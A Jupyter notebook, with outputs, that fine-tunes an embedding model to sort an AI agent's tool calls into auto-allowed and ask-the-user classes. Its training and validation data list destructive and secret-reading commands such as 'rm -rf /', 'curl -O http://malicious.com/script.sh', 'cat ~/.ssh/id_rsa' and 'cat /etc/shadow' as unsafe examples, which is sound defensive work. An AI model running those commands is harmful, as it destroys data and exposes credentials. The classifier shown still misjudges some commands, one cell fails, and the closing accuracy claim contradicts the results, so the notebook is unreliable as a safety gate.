In [1]:
# =============================================================================
# ENVIRONMENT SETUP
# =============================================================================
# This notebook fine-tunes EmbeddingGemma for permission classification.
# Goal: Classify tool calls as safe (auto-allow) or unsafe (ask user).
#
# Prerequisites:
# 1. Accept EmbeddingGemma license at: https://huggingface.co/google/embeddinggemma-300M
# 2. Create .env file with: HUGGINGFACE_TOKEN=hf_...
# =============================================================================

import sys
import subprocess
from pathlib import Path

venv_path = Path.home() / ".cli-agent" / "embeddinggemma_venv"
kernel_name = "embeddinggemma"
current_python = Path(sys.executable)
expected_python = venv_path / "bin" / "python"

if current_python.resolve() == expected_python.resolve():
    print("✓ Running in isolated environment")
else:
    print("⚠ Setting up isolated environment...")
    if not venv_path.exists():
        subprocess.run([sys.executable, "-m", "venv", str(venv_path)], check=True)
        pip_exe = venv_path / "bin" / "pip"
        subprocess.run([str(pip_exe), "install", "--upgrade", "pip", "-q"], check=True)
        subprocess.run([
            str(pip_exe), "install",
            "torch==2.6.0", "torchvision", "torchaudio",
            "--index-url", "https://download.pytorch.org/whl/cu118", "-q"
        ], check=True)
        subprocess.run([
            str(pip_exe), "install",
            "sentence-transformers", "transformers", "datasets",
            "python-dotenv", "huggingface-hub", "ipykernel",
            "plotly", "pandas", "nbformat", "-q"
        ], check=True)
        python_exe = venv_path / "bin" / "python"
        subprocess.run([
            str(python_exe), "-m", "ipykernel", "install",
            "--user", f"--name={kernel_name}",
            '--display-name=EmbeddingGemma (Python 3.12)'
        ], check=True)
    
    print("\n" + "="*70)
    print("ACTION REQUIRED: Switch kernel to 'EmbeddingGemma (Python 3.12)'")
    print("1. Kernel menu → Change Kernel → EmbeddingGemma (Python 3.12)")
    print("2. Kernel menu → Restart Kernel")
    print("3. Re-run this cell")
    print("="*70)
    raise SystemExit("⚠ Please switch kernels and restart")


✓ Running in isolated environment


In [2]:
# Verify packages and login to HuggingFace
import os
import torch
from dotenv import load_dotenv
from huggingface_hub import login
import sentence_transformers
import transformers

print(f"PyTorch: {torch.__version__} | CUDA: {torch.cuda.is_available()}")
print(f"sentence-transformers: {sentence_transformers.__version__}")
print(f"transformers: {transformers.__version__}")

load_dotenv()
token = os.getenv("HUGGINGFACE_TOKEN")
if not token:
    raise ValueError("HUGGINGFACE_TOKEN not found in .env file")
login(token=token)
print("\n✓ Environment ready")


~/.cli-agent/embeddinggemma_venv/lib/python3.12/site-packages/tqdm/auto.py:21: TqdmWarning: IProgress not found. Please update jupyter and ipywidgets. See https://ipywidgets.readthedocs.io/en/stable/user_install.html
  from .autonotebook import tqdm as notebook_tqdm


PyTorch: 2.6.0+cu118 | CUDA: True
sentence-transformers: 5.1.2
transformers: 4.57.1

✓ Environment ready


In [3]:
# Load EmbeddingGemma model
from sentence_transformers import SentenceTransformer

device = "cuda" if torch.cuda.is_available() else "cpu"
model = SentenceTransformer("google/embeddinggemma-300M", device=device, trust_remote_code=True)

print(f"Model loaded on {device}")
print(f"Parameters: {sum(p.numel() for p in model.parameters()):,}")

# Define anchor concepts for classification
task_name = "Clustering"  # Task type for EmbeddingGemma

# IMPROVED anchors to fix misclassifications:
# - "project files" and "non-sensitive" replace vague "reading"
# - "credentials" and "sensitive data" catch .aws/, .npmrc, etc.
# - "network transfer" catches scp, rsync
# - "inspection" and "monitoring" capture du, lsof, git diff
safe_anchors = ["safe", "inspection", "project files", "monitoring", "non-sensitive"]
unsafe_anchors = ["installing", "deleting", "credentials", "network transfer", "sensitive data", "destructive"]

print(f"\nAnchor concepts:")
print(f"  Safe: {safe_anchors}")
print(f"  Unsafe: {unsafe_anchors}")


Model loaded on cuda
Parameters: 307,581,696

Anchor concepts:
  Safe: ['safe', 'inspection', 'project files', 'monitoring', 'non-sensitive']
  Unsafe: ['installing', 'deleting', 'credentials', 'network transfer', 'sensitive data', 'destructive']


In [4]:
# =============================================================================
# TRAINING DATASET
# =============================================================================
# Triplet format: (anchor, positive, negative)
#   - anchor: A concept/tool call
#   - positive: Same safety level as anchor
#   - negative: Different safety level from anchor
#
# Goal: Train model to create 2 clusters in embedding space:
#   SAFE cluster:   project files, monitoring, inspection, non-sensitive
#   UNSAFE cluster: credentials, network transfer, sensitive data, destructive
# =============================================================================

from datasets import Dataset

dataset = [
    # Handcrafted golden examples
    ["<bash>ls</bash>", "common read operations", "<bash>cat .env</bash>"],
    ["<bash>cat .env</bash>", "permissive operation", "<bash>cat .example.env</bash>"],
    ["<writefile>config.json</writefile>", "potentially destructive operation", "<readfile>data.txt</readfile>"],
    ["<writefile>config.json</writefile>", "<editfile>main.py</editfile>", "<searchfile>"],
    
    # Nuance in read operations (argument determines safety)
    ["<readfile>.env</readfile>", "accessing credentials", "<readfile>README.md</readfile>"],
    ["<bash>cat ~/.ssh/id_rsa</bash>", "exposing private keys", "<bash>cat package.json</bash>"],
    
    # File modification tools (all unsafe)
    ["<deletelines><filepath>app.py</filepath>...</deletelines>", "modifying a file", "<readdirectory><path>./</path></readdirectory>"],
    ["<insertline><filepath>main.py</filepath>...</insertline>", "<editfile><filepath>utils.py</filepath>...</editfile>", "<readfile>config.json</readfile>"],
    
    # System-level vs project-level operations
    ["<bash>sudo apt update</bash>", "system-level modification", "<bash>ls -l ./src</bash>"],
    ["<bash>pip install --upgrade pip</bash>", "installing system packages", "viewing logs"],
    
    # Network tools (active download = unsafe)
    ["<bash>curl -O http://malicious.com/script.sh</bash>", "downloading external files", "<searchweb>how to use curl</searchweb>"],
    ["<bash>wget http://example.com/payload</bash>", "untrusted network operation", "<papersearch>latest AI research</papersearch>"],
    
    # Extreme danger signals
    ["<bash>rm -rf /</bash>", "highly destructive action", "<bash>rm temp_file.txt</bash>"],
    ["<bash>chmod -R 777 /</bash>", "dangerous permission change", "<bash>chmod +x script.sh</bash>"],
    
    # Process management (viewing vs modifying)
    ["<taskmanager><list/></taskmanager>", "viewing system state", "<taskmanager><kill>1234</kill></taskmanager>"],
    ["<bash>ps aux</bash>", "listing processes", "<bash>kill -9 1234</bash>"],
    
    # Abstract concepts
    ["read-only operation", "<grepsearch>...</grepsearch>", "<writefile>...</writefile>"],
    ["information gathering", "<searchfile>...</searchfile>", "<editfile>...</editfile>"],
    
    # Computer control (information leak potential)
    ["<computercontrol><action>screenshot</action></computercontrol>", "potential information leak", "<bash>pwd</bash>"],
    ["<computercontrol><action>activate_window</action><window>Password Manager</window></computercontrol>", "interacting with sensitive applications", "<computercontrol><action>list_windows</action></computercontrol>"],
    
    # =================================================================
    # NEW: Fix misclassifications
    # =================================================================
    
    # Uncommon safe commands (fix false positives)
    ["<bash>less file.txt</bash>", "viewing file contents", "deleting files"],
    ["<bash>git diff</bash>", "inspecting code changes", "git push"],
    ["<bash>du -sh</bash>", "checking disk usage", "rm -rf"],
    ["<bash>lsof</bash>", "listing open files", "kill process"],
    
    # Network transfers (CRITICAL - fix scp misclassification)
    ["<bash>scp remote:/file ./</bash>", "remote file transfer", "cat file"],
    ["<bash>rsync remote:/ ./</bash>", "synchronizing remote files", "ls local"],
    
    # Sensitive file patterns (fix credential file misclassifications)
    [".npmrc", ".aws/credentials", "README.md"],
    ["~/.bash_history", "command history file", "app.log"],
    
    # Directory navigation (fix cd confusion - navigation is safe)
    ["<bash>cd src</bash>", "<bash>cd /var/log</bash>", "<bash>cd ~/; rm -rf *</bash>"],
    ["<readdirectory><path>./tests</path></readdirectory>", "inspecting directory", "deleting directory"],
    
    # =================================================================
    # General patterns
    # =================================================================
    ["<bash>pwd</bash>", "cat file", "rm file"],
    ["read .log", "viewing", "modifying"],
    ["git status", "grep pattern", "git push"],
    [".env", ".credentials", "reading"],
    ["curl", "wget", "ls"],
    ["delete file", "rm -rf", "cat file"],
    ["pip install", "npm install", "view"],
    ["reading", "viewing", "writing"],
    ["listing", "searching", "installing"],
    ["safe", "harmless", "dangerous"],
    ["writing", "deleting", "reading"],
    ["modifying", "executing", "viewing"],
    ["installing", "destructive", "safe"],
    ["<readfile>XXX.py</readfile>", "read .log", ".env"],
    ["<bash>cat file</bash>", "<bash>ls</bash>", "<bash>rm file</bash>"],
    ["<writefile>config.json</writefile>", "<editfile>main.py</editfile>", "<readfile>data.txt</readfile>"],
    ["<bash>chmod +x</bash>", "sudo", "viewing"],
]

train_dataset = Dataset.from_list([{"anchor": r[0], "positive": r[1], "negative": r[2]} for r in dataset])
print(f"Training dataset: {len(dataset)} triplets")
print(f"  - Original: 38 triplets")
print(f"  - Added: {len(dataset) - 38} new triplets to fix misclassifications")


Training dataset: 47 triplets
  - Original: 38 triplets
  - Added: 9 new triplets to fix misclassifications


In [5]:
# =============================================================================
# BEFORE FINE-TUNING (Optional - see baseline performance)
# =============================================================================
# Test base model with "curl" - should be unsafe but base model is unclear

def get_similarity_scores(query, documents):
    query_emb = model.encode(query, prompt_name=task_name)
    doc_embs = model.encode(documents, prompt_name=task_name)
    sims = model.similarity(query_emb, doc_embs)
    for idx, doc in enumerate(documents):
        print(f"  {doc:20} -> {sims.numpy()[0][idx]:.3f}")

query = "curl"
print(f"Query: '{query}' (should be UNSAFE)\n")
print("Safe anchors (should have LOW similarity):")
get_similarity_scores(query, safe_anchors)
print("\nUnsafe anchors (should have HIGH similarity):")
get_similarity_scores(query, unsafe_anchors)
print("\n→ Base model shows similar scores for safe and unsafe - needs fine-tuning!")


Query: 'curl' (should be UNSAFE)

Safe anchors (should have LOW similarity):
  safe                 -> 0.903
  inspection           -> 0.887
  project files        -> 0.852
  monitoring           -> 0.882
  non-sensitive        -> 0.883

Unsafe anchors (should have HIGH similarity):
  installing           -> 0.901
  deleting             -> 0.872
  credentials          -> 0.900
  network transfer     -> 0.854
  sensitive data       -> 0.879
  destructive          -> 0.890

→ Base model shows similar scores for safe and unsafe - needs fine-tuning!


In [6]:
# =============================================================================
# TRAINING WITH ADAPTIVE LR REDUCTION
# =============================================================================
# MultipleNegativesRankingLoss pushes same-safety concepts together:
#   - curl clusters with wget, installing (unsafe)
#   - curl separates from reading, ls (safe)
#
# Adaptive strategy:
#   - Track best validation accuracy and save checkpoint
#   - If accuracy drops 2 consecutive times: restore best checkpoint + lr *= 0.1
#   - Step counter always increments (no reset)
# =============================================================================

from sentence_transformers import SentenceTransformerTrainer, SentenceTransformerTrainingArguments
from sentence_transformers.losses import MultipleNegativesRankingLoss
from transformers import TrainerCallback
from transformers.trainer_callback import PrinterCallback
import numpy as np
import copy

# Define validation function
def run_validation(model, task_name, safe_anchors, unsafe_anchors, test_data, threshold=0.02):
    """Run validation and return accuracy and details"""
    correct = 0
    results = []
    misclassified = []
    
    for tool_call, expected in test_data:
        query_emb = model.encode(tool_call, prompt_name=task_name)
        safe_embs = model.encode(safe_anchors, prompt_name=task_name)
        unsafe_embs = model.encode(unsafe_anchors, prompt_name=task_name)
        
        avg_safe = model.similarity(query_emb, safe_embs).numpy()[0].mean()
        avg_unsafe = model.similarity(query_emb, unsafe_embs).numpy()[0].mean()
        safety_score = (avg_safe - avg_unsafe) / (avg_safe + avg_unsafe)
        
        if safety_score > threshold:
            decision = "AUTO-ALLOW"
        elif safety_score < -threshold:
            decision = "ASK (unsafe)"
        else:
            decision = "NEUTRAL"
        
        is_correct = (expected == "safe" and decision == "AUTO-ALLOW") or \
                     (expected == "unsafe" and decision == "ASK (unsafe)")
        
        if is_correct:
            correct += 1
        else:
            misclassified.append({'tool_call': tool_call, 'expected': expected, 'decision': decision, 'safety_score': safety_score})

        results.append({
            'tool_call': tool_call,
            'expected': expected,
            'decision': decision,
            'safety_score': safety_score,
            'correct': is_correct
        })
    
    accuracy = 100 * correct / len(test_data)
    return accuracy, results, misclassified

# Load test data (same as cell 7)
test_tool_calls = [
    # SAFE: Read operations
    ("<bash>cat requirements.txt</bash>", "safe"),
    ("<bash>head -n 20 app.log</bash>", "safe"),
    ("<bash>tail -f server.log</bash>", "safe"),
    ("<readfile><filepath>./src/utils.py</filepath></readfile>", "safe"),
    ("<readfile><filepath>./docs/API.md</filepath></readfile>", "safe"),
    ("<bash>less poetry.lock</bash>", "safe"),
    ("<bash>find . -name '*.py'</bash>", "safe"),
    # UNSAFE: Sensitive file access
    ("<readfile><filepath>.aws/credentials</filepath></readfile>", "unsafe"),
    ("<bash>cat ~/.bash_history</bash>", "unsafe"),
    ("<readfile><filepath>config/secrets.json</filepath></readfile>", "unsafe"),
    ("<bash>cat /etc/shadow</bash>", "unsafe"),
    ("<readfile><filepath>.npmrc</filepath></readfile>", "unsafe"),
    # SAFE: Information gathering
    ("<bash>git log --oneline -10</bash>", "safe"),
    ("<bash>git diff HEAD~1</bash>", "safe"),
    ("<bash>docker ps</bash>", "safe"),
    ("<bash>top -n 1</bash>", "safe"),
    ("<bash>du -sh *</bash>", "safe"),
    ("<bash>env | grep PATH</bash>", "safe"),
    ("<readdirectory><path>./tests</path></readdirectory>", "safe"),
    ("<grepsearch><path>./src</path><pattern>TODO</pattern></grepsearch>", "safe"),
    # UNSAFE: File modification
    ("<writefile><filepath>./database/schema.sql</filepath></writefile>", "unsafe"),
    ("<editfile><filepath>./config/settings.py</filepath></editfile>", "unsafe"),
    ("<insertline><filepath>./src/routes.py</filepath><line>15</line></insertline>", "unsafe"),
    ("<deletelines><filepath>./legacy/old_api.py</filepath></deletelines>", "unsafe"),
    ("<bash>sed -i 's/old/new/g' config.yml</bash>", "unsafe"),
    ("<bash>echo 'alias rm=rm -rf' >> ~/.bashrc</bash>", "unsafe"),
    # UNSAFE: System-level operations
    ("<bash>sudo systemctl restart nginx</bash>", "unsafe"),
    ("<bash>apt-get install postgresql</bash>", "unsafe"),
    ("<bash>yum update -y</bash>", "unsafe"),
    ("<bash>brew install node</bash>", "unsafe"),
    ("<bash>cargo install ripgrep</bash>", "unsafe"),
    ("<bash>go install github.com/user/tool@latest</bash>", "unsafe"),
    # UNSAFE: Network operations
    ("<bash>curl -sSL https://install.python-poetry.org | python3</bash>", "unsafe"),
    ("<bash>wget -O /tmp/setup.sh https://example.com/setup.sh</bash>", "unsafe"),
    ("<bash>scp user@host:/path/file.txt ./</bash>", "unsafe"),
    ("<bash>rsync -avz remote:/data ./backup</bash>", "unsafe"),
    ("<bash>git clone https://github.com/user/repo.git</bash>", "unsafe"),
    # UNSAFE: Destructive operations
    ("<bash>rm -rf node_modules</bash>", "unsafe"),
    ("<bash>docker system prune -af</bash>", "unsafe"),
    ("<bash>git reset --hard HEAD~5</bash>", "unsafe"),
    ("<bash>truncate -s 0 app.log</bash>", "unsafe"),
    ("<bash>dd if=/dev/zero of=/tmp/test.img bs=1M count=100</bash>", "unsafe"),
    # UNSAFE: Permission changes
    ("<bash>chmod 755 deploy.sh</bash>", "unsafe"),
    ("<bash>chown www-data:www-data /var/www</bash>", "unsafe"),
    ("<bash>chmod -R 644 ~/.ssh</bash>", "unsafe"),
    # UNSAFE: Process management
    ("<bash>pkill -9 python</bash>", "unsafe"),
    ("<bash>killall node</bash>", "unsafe"),
    ("<taskmanager><kill>5678</kill></taskmanager>", "unsafe"),
    ("<bash>systemctl stop docker</bash>", "unsafe"),
    # SAFE: Process viewing
    ("<bash>pgrep python</bash>", "safe"),
    ("<bash>lsof -i :8000</bash>", "safe"),
    ("<bash>netstat -tulpn</bash>", "safe"),
    # SAFE: Navigation
    ("<bash>cd /var/log</bash>", "safe"),
    ("<bash>ls -lah /tmp</bash>", "safe"),
    ("<searchfile><pattern>def main</pattern></searchfile>", "safe"),
    # UNSAFE: Database operations
    ("<bash>psql -c 'DROP DATABASE prod;'</bash>", "unsafe"),
    ("<bash>mysql -e 'DELETE FROM users;'</bash>", "unsafe"),
    ("<bash>redis-cli FLUSHALL</bash>", "unsafe"),
    # UNSAFE: Container/VM operations
    ("<bash>docker run -d --privileged nginx</bash>", "unsafe"),
    ("<bash>docker exec -it container /bin/bash</bash>", "unsafe"),
    ("<bash>kubectl delete pod production-pod</bash>", "unsafe"),
    # Abstract concepts
    ("inspecting", "safe"),
    ("examining", "safe"),
    ("observing", "safe"),
    ("monitoring", "safe"),
    ("removing", "unsafe"),
    ("altering", "unsafe"),
    ("downloading", "unsafe"),
    ("executing", "unsafe"),
]

# Custom callback with adaptive LR reduction and checkpoint restoration
class AdaptiveLRCallback(TrainerCallback):
    def __init__(self, model, task_name, safe_anchors, unsafe_anchors, test_data):
        self.model = model
        self.task_name = task_name
        self.safe_anchors = safe_anchors
        self.unsafe_anchors = unsafe_anchors
        self.test_data = test_data
        self.first_log = True
        
        # Tracking for adaptive LR
        self.best_accuracy = 0.0
        self.best_model_state = None
        self.accuracy_history = []  # Track last 2 accuracies
        self.current_lr = None
    
    def on_log(self, args, state, control, logs=None, **kwargs):
        """Print step, loss, and accuracy in table format with adaptive LR"""
        if logs is None:
            return
        
        # Print header on first log
        if self.first_log:
            print(f"\n{'Step':<8}{'Training Loss':<18}{'Accuracy':<12}{'Event'}")
            self.first_log = False
        
        step = state.global_step
        loss = logs.get('loss', None)
        
        # Get current learning rate
        if self.current_lr is None:
            self.current_lr = args.learning_rate
        
        # Run validation
        accuracy, _, _ = run_validation(
            self.model, self.task_name, self.safe_anchors, 
            self.unsafe_anchors, self.test_data
        )
        
        event = ""
        
        # Check if new best
        if accuracy > self.best_accuracy:
            self.best_accuracy = accuracy
            # Save model checkpoint
            self.best_model_state = copy.deepcopy(self.model.state_dict())
            event = "✓ New best"
            # Reset history when we get a new best
            self.accuracy_history = [accuracy]
        else:
            # Track accuracy for drop detection
            self.accuracy_history.append(accuracy)
            
            # Check for 2 consecutive drops
            if len(self.accuracy_history) >= 3:
                last_three = self.accuracy_history[-3:]
                if last_three[0] > last_three[1] > last_three[2]:
                    # Two consecutive drops detected - restore and reduce LR
                    if self.best_model_state is not None:
                        # Restore best model
                        self.model.load_state_dict(self.best_model_state)
                        
                        # Reduce learning rate by 10x
                        self.current_lr *= 0.1
                        for param_group in kwargs.get('optimizer').param_groups:
                            param_group['lr'] = self.current_lr
                        
                        event = f"⟳ Restored best, LR={self.current_lr:.1e}"
                        
                        # Reset history but keep current accuracy
                        self.accuracy_history = [accuracy]
            
            # Keep only last 3 accuracies
            if len(self.accuracy_history) > 3:
                self.accuracy_history = self.accuracy_history[-3:]
        
        # Print row
        loss_str = f"{loss:.6f}" if loss is not None else "N/A"
        print(f"{step:<8}{loss_str:<18}{accuracy:<11.1f}%{event}")

# Setup training
loss = MultipleNegativesRankingLoss(model)

args = SentenceTransformerTrainingArguments(
    output_dir="my-embedding-gemma",
    prompts=model.prompts[task_name],
    num_train_epochs=5,
    per_device_train_batch_size=1,
    learning_rate=2e-5,
    warmup_ratio=0.1,
    logging_steps=10,
    report_to="none",
    disable_tqdm=True,  # Disable progress bar to keep output clean
)

trainer = SentenceTransformerTrainer(
    model=model,
    args=args,
    train_dataset=train_dataset,
    loss=loss,
)

# Remove default printer callback and add our custom one
trainer.remove_callback(PrinterCallback)
adaptive_callback = AdaptiveLRCallback(model, task_name, safe_anchors, unsafe_anchors, test_tool_calls)
trainer.add_callback(adaptive_callback)

print("Training with adaptive LR reduction...")
result = trainer.train()
print(f"\n✓ Training complete | Final loss: {result.training_loss:.4f}")
print(f"✓ Best accuracy: {adaptive_callback.best_accuracy:.1f}%")


Training with adaptive LR reduction...

Step    Training Loss     Accuracy    Event
10      0.884100          13.0       %✓ New best
20      1.121800          31.9       %✓ New best
30      2.160100          82.6       %✓ New best
40      2.306300          94.2       %✓ New best
50      1.441500          89.9       %
60      0.528000          84.1       %⟳ Restored best, LR=2.0e-06
70      1.212400          76.8       %
80      0.904100          95.7       %✓ New best
90      0.759700          72.5       %
100     0.001600          79.7       %
110     1.525700          84.1       %
120     0.001900          88.4       %
130     0.000100          91.3       %
140     0.064200          87.0       %
150     0.163600          85.5       %⟳ Restored best, LR=2.0e-07
160     0.000100          95.7       %
170     0.000100          91.3       %
180     0.000100          92.8       %
190     0.190000          92.8       %
200     0.000000          92.8       %
210     0.000000          92.8  

In [7]:
# =============================================================================
# AFTER FINE-TUNING - Verify cluster separation
# =============================================================================

print(f"Query: '{query}' (should be UNSAFE)\n")
print("Safe anchors (should have LOW similarity):")
get_similarity_scores(query, safe_anchors)
print("\nUnsafe anchors (should have HIGH similarity):")
get_similarity_scores(query, unsafe_anchors)

# Calculate safety score
query_emb = model.encode(query, prompt_name=task_name)
safe_embs = model.encode(safe_anchors, prompt_name=task_name)
unsafe_embs = model.encode(unsafe_anchors, prompt_name=task_name)

avg_safe_sim = model.similarity(query_emb, safe_embs).numpy().mean()
avg_unsafe_sim = model.similarity(query_emb, unsafe_embs).numpy().mean()
safety_score = (avg_safe_sim - avg_unsafe_sim) / (avg_safe_sim + avg_unsafe_sim)

print(f"\n{'='*50}")
print(f"Avg similarity to SAFE:   {avg_safe_sim:.3f}")
print(f"Avg similarity to UNSAFE: {avg_unsafe_sim:.3f}")
print(f"Safety score: {safety_score:.3f}")
print(f"Decision: {'AUTO-ALLOW' if safety_score > 0 else 'ASK USER'} ✓")


Query: 'curl' (should be UNSAFE)

Safe anchors (should have LOW similarity):
  safe                 -> -0.057
  inspection           -> -0.115
  project files        -> 0.512
  monitoring           -> 0.079
  non-sensitive        -> 0.074

Unsafe anchors (should have HIGH similarity):
  installing           -> 0.873
  deleting             -> 0.519
  credentials          -> 0.632
  network transfer     -> 0.727
  sensitive data       -> 0.315
  destructive          -> 0.871

Avg similarity to SAFE:   0.099
Avg similarity to UNSAFE: 0.656
Safety score: -0.739
Decision: ASK USER ✓


In [8]:
# =============================================================================
# VALIDATION SET INFO
# =============================================================================
# The validation set is now loaded in the training cell (cell 5) and runs
# automatically during training. This cell shows a summary.

print(f"Validation set: {len(test_tool_calls)} examples")
print(f"  Safe: {sum(1 for _, exp in test_tool_calls if exp == 'safe')}")
print(f"  Unsafe: {sum(1 for _, exp in test_tool_calls if exp == 'unsafe')}")
print("\nValidation runs automatically every 10 training steps.")
print("See output from cell 5 for per-step results.")


Validation set: 69 examples
  Safe: 25
  Unsafe: 44

Validation runs automatically every 10 training steps.
See output from cell 5 for per-step results.


In [9]:
# =============================================================================
# FINAL VALIDATION - Detailed analysis after training
# =============================================================================

import pandas as pd

# Run final validation with full details
accuracy, decisions, misclassified = run_validation(
    model, task_name, safe_anchors, unsafe_anchors, test_tool_calls
)

df = pd.DataFrame(decisions)

print(f"\n{'='*60}")
print(f"Final Validation Accuracy: {accuracy:.1f}%")
print(f"{'='*60}")

print(f"\nMisclassified items ({len(misclassified)}):")
for item in misclassified:
    print(f"  • {item['tool_call']}")
    print(f"    Expected: {item['expected']} | Decision: {item['decision']} | Score: {item['safety_score']:.3f}")

print(f"\nFull Results (first 5):")
print(df.head())



Final Validation Accuracy: 92.8%

Misclassified items (5):
  • <bash>less poetry.lock</bash>
    Expected: safe | Decision: ASK (unsafe) | Score: -0.452
  • <bash>cat ~/.bash_history</bash>
    Expected: unsafe | Decision: AUTO-ALLOW | Score: 0.636
  • <bash>env | grep PATH</bash>
    Expected: safe | Decision: ASK (unsafe) | Score: -0.579
  • <bash>dd if=/dev/zero of=/tmp/test.img bs=1M count=100</bash>
    Expected: unsafe | Decision: AUTO-ALLOW | Score: 0.605
  • <bash>cd /var/log</bash>
    Expected: safe | Decision: ASK (unsafe) | Score: -0.558

Full Results (first 5):
                                           tool_call expected    decision  \
0                  <bash>cat requirements.txt</bash>     safe  AUTO-ALLOW   
1                    <bash>head -n 20 app.log</bash>     safe  AUTO-ALLOW   
2                    <bash>tail -f server.log</bash>     safe  AUTO-ALLOW   
3  <readfile><filepath>./src/utils.py</filepath><...     safe  AUTO-ALLOW   
4  <readfile><filepath>./docs/API

In [10]:
# =============================================================================
# VISUALIZATION - 1D scatter plot of safety scores
# =============================================================================

import plotly.graph_objects as go

colors = []
for decision in df['decision']:
    if decision == 'AUTO-ALLOW':
        colors.append('rgb(0, 200, 0)')  # Green
    elif decision == 'ASK (unsafe)':
        colors.append('rgb(255, 100, 0)')  # Orange
    else:
        colors.append('rgb(100, 100, 255)')  # Blue

fig = go.Figure()

fig.add_trace(go.Scatter(
    x=df['safety_score'],
    y=[0] * len(df),
    mode='markers+text',
    marker=dict(size=10, color=colors, line=dict(width=1, color='white'), opacity=0.8),
    text=[tc[:40] + '...' if len(tc) > 40 else tc for tc in df['tool_call']],
    textposition='top center',
    textfont=dict(size=6),
    customdata=df[['tool_call', 'safety_score', 'decision', 'expected', 'correct']].values,
    hovertemplate='<b>%{customdata[0]}</b><br>Score: %{customdata[1]:.3f}<br>Decision: %{customdata[2]}<br>Expected: %{customdata[3]}<br>Correct: %{customdata[4]}<extra></extra>'
))

fig.add_vline(x=threshold, line_dash="dash", line_color="green", annotation_text=f"Auto-Allow (+{threshold})")
fig.add_vline(x=-threshold, line_dash="dash", line_color="orange", annotation_text=f"Unsafe (-{threshold})")
fig.add_vline(x=0, line_dash="dot", line_color="gray", annotation_text="Zero")

fig.update_layout(
    title=f'Fine-Tuned Model Results - {accuracy:.1f}% Accuracy<br><sub>Green=Safe | Orange=Unsafe | Blue=Neutral</sub>',
    width=1400,
    height=600,
    xaxis=dict(title='Safety Score', gridcolor='lightgray', range=[df['safety_score'].min() - 0.05, df['safety_score'].max() + 0.05]),
    yaxis=dict(visible=False, range=[-0.5, 0.5]),
    showlegend=False,
    plot_bgcolor='white',
    hoverlabel=dict(bgcolor="white", font_size=11)
)

fig.show()
print(f"\nSafety score range: [{df['safety_score'].min():.3f}, {df['safety_score'].max():.3f}]")


NameError: name 'threshold' is not defined

In [ ]:
# =============================================================================
# SAVE MODEL (Optional)
# =============================================================================
# Uncomment to save locally or push to HuggingFace Hub

# Save locally
# model.save("my-embedding-gemma-finetuned")
# print("✓ Saved to my-embedding-gemma-finetuned/")

# Push to HuggingFace Hub
# model.push_to_hub("my-embedding-gemma")
# print("✓ Uploaded to HuggingFace Hub")

print("Training complete!")
print("\nNext steps:")
print("  - With 100s-1000s more examples, accuracy can reach 70%+")
print("  - Deploy for real-time permission classification")
print("  - See permission_classifier_simplified.ipynb for production implementation")
